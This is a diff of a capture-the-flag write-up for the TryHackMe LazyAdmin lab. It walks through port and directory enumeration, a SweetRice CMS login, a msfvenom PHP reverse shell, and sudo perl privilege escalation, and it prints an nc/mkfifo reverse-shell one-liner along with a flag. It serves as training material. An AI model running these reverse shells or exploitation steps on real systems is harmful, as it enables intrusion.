@@ -28,6 +28,7 @@ rtt min/avg/max/mdev = 213.750/218.906/224.133/3.873 ms
 -----
 
 **Host Enumeration**
+
 After confirming that  I can reach the target. I ran an nmap scan.
 
 
@@ -58,8 +59,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 24.50 seconds
 
 ```
----
+-----
 **Website Enumeration (Port 80)**
+
 ![http-10 10 198 128-](https://github.com/paRaade/CTF-Writeups/assets/126734769/90380ba1-adae-44e7-bf50-01981dae60c3)
 
 
@@ -94,6 +96,7 @@ server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration:
 :: Progress: [220546/220546] :: Job [1/1] :: 179 req/sec :: Duration: [0:20:56] :: Errors: 0 ::
                                                                                                           
 ```
+-----
 **Content Directory**
 
 Accessing the provided URL, http://10.10.198.128/content/, discloses a content management system called Sweet Rice
@@ -134,7 +137,7 @@ attachment              [Status: 301, Size: 327, Words: 20, Lines: 10, Duration:
                         [Status: 200, Size: 2199, Words: 109, Lines: 36, Duration: 244ms]
 :: Progress: [220546/220546] :: Job [1/1] :: 179 req/sec :: Duration: [0:21:01] :: Errors: 0 :
 ```
-
+-----
 **Further enumeration**
 
 ```
@@ -164,7 +167,7 @@ Sweet Rice Login Portal: http://10.10.198.128/content/as/
 Using the following credentials I was able to successfully login to SweetRice
 **username**: manager
 **password**: Password123
-
+-----
 **Searchsploit**
 
 Knowing the version of Sweet Rice from prior enumeration allowed me to narrow down the possible attack vectors to get an initial foothold on the target system
@@ -193,6 +196,7 @@ File Type: HTML document, ASCII text
 Copied to: /root/Desktop/Tryhackme/LazyAdmin/40700.html
 
 ```
+-----
 **Contents of 40700.html**
 
 To summarize, the contents of this html file, a php reverse shell can be generated
@@ -213,6 +217,7 @@ Code You Can
 
 Customize Exploit For Your Self .
 ```
+-----
 **Reverse Shell Payload Creation**
 Using msfvenom I create a php  meterpreter reverse shell 
 ```
@@ -223,6 +228,7 @@ No encoder specified, outputting raw payload
 Payload size: 34849 bytes
 
 ```
+-----
 **Starting Metasploit**
 
 I  then start metasploit and the following commands. 
@@ -257,7 +263,7 @@ http://10.10.198.128/content/inc/ads/
 
 
 
-
+-----
 **Initial Foothold** 
 
 The user.txt flag can be found in the /home/itguy directory
@@ -284,7 +290,7 @@ THM{63e5bce9271952aad1113b6f1ac28a07}
 ```
 
 
-
+-----
 **Privilege Escalation**
 
 The user www-data has root privileges to run perl and run a script called backup. pl
@@ -298,9 +304,8 @@ Matching Defaults entries for www-data on THM-Chal:
 
 User www-data may run the following commands on THM-Chal:
     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
-
-
 ```
+-----
 **backup. pl**
 
 The backup. pl file is a perl script that executes a shell script
@@ -311,6 +316,7 @@ cat /home/itguy/backup.pl
 system("sh", "/etc/copy.sh");
 
 ```
+-----
 **copy. sh**
 
 The copy. sh script creates a reverse shell
@@ -319,7 +325,7 @@ cat /etc/copy.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 ```
 
-
+-----
 **Root Reverse Shell**
 
 I replaced the IP address in the copy .sh script with my IP (tun0) and replaced the contents of the copy. sh script. After this I ran netcat. Once I ran the the backup .pl script with the sudo command a new reverse shell is created as a root user. I can now read the root.txt flag under the root directory
